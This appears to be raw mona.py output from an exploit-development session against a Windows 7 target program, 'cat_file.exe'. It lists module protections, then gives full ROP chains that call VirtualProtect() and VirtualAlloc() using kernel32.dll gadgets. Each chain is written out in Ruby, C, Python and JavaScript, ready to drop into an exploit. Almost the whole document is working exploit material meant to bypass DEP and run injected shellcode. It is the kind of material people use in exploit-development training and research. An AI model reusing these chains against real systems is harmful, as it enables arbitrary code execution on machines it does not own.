-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x758e0000 | 0x7592a000 | 0x0004a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x77710000 | 0x7784c000 | 0x0013c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x765d0000 | 0x766a4000 | 0x000d4000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x761f0000 | 0x7629c000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x00400000 | 0x0044b000 | 0x0004b000 | False  | False   | False |  False   | False  | -1.0- [cat_file.exe] (C:\Users\admin\Desktop\cat_file.exe)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x7667757e,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x765d1924,  # ptr to &VirtualProtect() [IAT kernel32.dll] ** REBASED ** ASLR
      0x7661b5c2,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN 0x08 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      0x76627199,  # PUSH EAX # INC EAX # MOV DWORD PTR DS:[EDX+2C],ECX # POP ESI # POP EBP # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x76638a46,  # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x765d19b8,  # & push esp # ret  [kernel32.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7663899a,  # POP EBX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x76647bca,  # POP EDX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x76638b8f,  # POP ECX # POP EBX # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x7669612d,  # &Writable location [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_edi:---]
      0x76638a43,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x7663899b,  # RETN (ROP NOP) [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_eax:---]
      0x766756e9,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x766007f0,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x7667757e,  // POP EAX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x765d1924,  // ptr to &VirtualProtect() [IAT kernel32.dll] ** REBASED ** ASLR
      0x7661b5c2,  // MOV EAX,DWORD PTR DS:[EAX] // POP EBP // RETN 0x08 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (compensate)
      0x76627199,  // PUSH EAX // INC EAX // MOV DWORD PTR DS:[EDX+2C],ECX // POP ESI // POP EBP // RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_ebp:---]
      0x76638a46,  // POP EBP // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x765d19b8,  // & push esp // ret  [kernel32.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x7663899a,  // POP EBX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000201,  // 0x00000201-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x76647bca,  // POP EDX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000040,  // 0x00000040-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x76638b8f,  // POP ECX // POP EBX // RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x7669612d,  // &Writable location [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_edi:---]
      0x76638a43,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x7663899b,  // RETN (ROP NOP) [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_eax:---]
      0x766756e9,  // POP EAX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x766007f0,  // PUSHAD // RETN [kernel32.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x7667757e,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x765d1924,  # ptr to &VirtualProtect() [IAT kernel32.dll] ** REBASED ** ASLR
      0x7661b5c2,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN 0x08 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      0x76627199,  # PUSH EAX # INC EAX # MOV DWORD PTR DS:[EDX+2C],ECX # POP ESI # POP EBP # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x76638a46,  # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x765d19b8,  # & push esp # ret  [kernel32.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7663899a,  # POP EBX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x76647bca,  # POP EDX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x76638b8f,  # POP ECX # POP EBX # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x7669612d,  # &Writable location [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_edi:---]
      0x76638a43,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x7663899b,  # RETN (ROP NOP) [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_eax:---]
      0x766756e9,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x766007f0,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u757e%u7667" + // 0x7667757e : ,# POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u1924%u765d" + // 0x765d1924 : ,# ptr to &VirtualProtect() [IAT kernel32.dll] ** REBASED ** ASLR
    "%ub5c2%u7661" + // 0x7661b5c2 : ,# MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN 0x08 [kernel32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u7199%u7662" + // 0x76627199 : ,# PUSH EAX # INC EAX # MOV DWORD PTR DS:[EDX+2C],ECX # POP ESI # POP EBP # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u8a46%u7663" + // 0x76638a46 : ,# POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u19b8%u765d" + // 0x765d19b8 : ,# & push esp # ret[kernel32.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u899a%u7663" + // 0x7663899a : ,# POP EBX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u7bca%u7664" + // 0x76647bca : ,# POP EDX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u8b8f%u7663" + // 0x76638b8f : ,# POP ECX # POP EBX # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
    "%u612d%u7669" + // 0x7669612d : ,# &Writable location [kernel32.dll] ** REBASED ** ASLR
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u8a43%u7663" + // 0x76638a43 : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u899b%u7663" + // 0x7663899b : ,# RETN (ROP NOP) [kernel32.dll] ** REBASED ** ASLR
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u56e9%u7667" + // 0x766756e9 : ,# POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u07f0%u7660" + // 0x766007f0 : ,# PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x766754d4,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x765d1918,  # ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x7661b5c2,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN 0x08 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      0x76627199,  # PUSH EAX # INC EAX # MOV DWORD PTR DS:[EDX+2C],ECX # POP ESI # POP EBP # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x766678f6,  # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x765d19b8,  # & push esp # ret  [kernel32.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7663899a,  # POP EBX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x76687170,  # POP EDX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x76638b8d,  # POP ECX # POP EBP # POP ECX # POP EBX # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> ecx
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_edi:---]
      0x76638a11,  # POP EDI # POP ESI # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x7663899b,  # RETN (ROP NOP) [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_eax:---]
      0x76676ca5,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x766007f0,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x766754d4,  // POP EAX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x765d1918,  // ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x7661b5c2,  // MOV EAX,DWORD PTR DS:[EAX] // POP EBP // RETN 0x08 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (compensate)
      0x76627199,  // PUSH EAX // INC EAX // MOV DWORD PTR DS:[EDX+2C],ECX // POP ESI // POP EBP // RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_ebp:---]
      0x766678f6,  // POP EBP // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x765d19b8,  // & push esp // ret  [kernel32.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x7663899a,  // POP EBX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000001,  // 0x00000001-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x76687170,  // POP EDX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00001000,  // 0x00001000-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x76638b8d,  // POP ECX // POP EBP // POP ECX // POP EBX // RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x00000040,  // 0x00000040-> ecx
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_edi:---]
      0x76638a11,  // POP EDI // POP ESI // POP EBP // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x7663899b,  // RETN (ROP NOP) [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_eax:---]
      0x76676ca5,  // POP EAX // RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x766007f0,  // PUSHAD // RETN [kernel32.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x766754d4,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x765d1918,  # ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x7661b5c2,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN 0x08 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      0x76627199,  # PUSH EAX # INC EAX # MOV DWORD PTR DS:[EDX+2C],ECX # POP ESI # POP EBP # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x766678f6,  # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x765d19b8,  # & push esp # ret  [kernel32.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7663899a,  # POP EBX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x76687170,  # POP EDX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x76638b8d,  # POP ECX # POP EBP # POP ECX # POP EBX # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> ecx
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_edi:---]
      0x76638a11,  # POP EDI # POP ESI # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x7663899b,  # RETN (ROP NOP) [kernel32.dll] ** REBASED ** ASLR
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_eax:---]
      0x76676ca5,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x766007f0,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u54d4%u7667" + // 0x766754d4 : ,# POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u1918%u765d" + // 0x765d1918 : ,# ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
    "%ub5c2%u7661" + // 0x7661b5c2 : ,# MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN 0x08 [kernel32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u7199%u7662" + // 0x76627199 : ,# PUSH EAX # INC EAX # MOV DWORD PTR DS:[EDX+2C],ECX # POP ESI # POP EBP # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u78f6%u7666" + // 0x766678f6 : ,# POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u19b8%u765d" + // 0x765d19b8 : ,# & push esp # ret[kernel32.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u899a%u7663" + // 0x7663899a : ,# POP EBX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u7170%u7668" + // 0x76687170 : ,# POP EDX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u8b8d%u7663" + // 0x76638b8d : ,# POP ECX # POP EBP # POP ECX # POP EBX # RETN 0x04 [kernel32.dll] ** REBASED ** ASLR 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u8a11%u7663" + // 0x76638a11 : ,# POP EDI # POP ESI # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u899b%u7663" + // 0x7663899b : ,# RETN (ROP NOP) [kernel32.dll] ** REBASED ** ASLR
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u6ca5%u7667" + // 0x76676ca5 : ,# POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u07f0%u7660" + // 0x766007f0 : ,# PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------

